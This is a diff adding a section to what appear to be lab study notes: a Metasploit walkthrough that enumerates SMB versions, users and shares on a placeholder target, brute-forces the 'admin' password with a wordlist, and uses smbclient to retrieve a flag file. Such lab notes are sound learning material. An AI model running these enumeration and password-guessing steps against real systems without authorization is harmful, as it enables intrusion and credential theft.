@@ -270,6 +270,90 @@ msf6:`exit`
 
 We obtained the flag.
 
+## SMB Enumeration
+
+- SMB is a network file sharing protocol that is used to facilitate the sharing and peripherals between computers on a local network (LAN).
+- SMB uses port 445. (TCP). However, originally, SMB ran on top o NetBIOS using port 139.
+- SMB uses port 445 (TCP). Originally, SMB ran on top of NetBIOS using port 139.
+- SAMBA is the linux implementation of SMB, and allows Windows systems to access Linux shares and devices.
+- We can utilize auxiliary modules to enumerate the SMB version, shares, users and perform a brute-force attack in order to identify users and passwords.
+
+## Demo: SMB Enumeration
+
+`ifconfig`
+
+`service postgresql start`
+
+`workspace -a SMB_ENUM`
+
+`msfconsole`
+
+msf6:`setg rhosts [targetIP]` With "setg" the variable "RHOSTS" with every module we use.
+
+msf6:`search smb`
+
+msf6:`search type:auxiliary name:smb`
+
+msf6:`use auxiliary/scanner/smb/smb_version`
+
+msf6:`run`
+
+Now we could use the Samba version to get a exploit for the target. But instead we're going to look for usernames instead:
+
+msf6:`search type:auxiliary name:smb`
+
+msf6:`use auxiliary/scanner/smb/smb_enumusers`
+
+msf6`run`
+
+We got the usernames. Now we look for shares:
+
+msf6:`search type:auxiliary name:smb`
+
+msf6:`use auxiliary/scanner/smb/smb_enumshares`
+
+msf6:`show options`
+
+msf6:`set ShowFiles true`
+
+msf6:`run`
+
+We try to access the shares through enumerating the password for the user "admin".
+
+msf6:`search smb_login`
+
+msf6:`use 1`
+
+msf6:`show options`
+
+msf6:`set smbuser admin`
+
+msf6:`set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
+
+msf6:`run`
+
+We obtained the admin credentials.
+
+msf6:`exit`
+
+`smbcliient -L \\\\[targetIP]\\ -U admin`
+
+`smbcliient \\\\[targetIP]\\public -U admin`
+
+smb:`ls`
+
+smb:`cd secret`
+
+smb:`get flag.txt`
+
+smb:`exit`
+
+smb:`cat flag.txt`
+
+
+
+
+
 
 
 
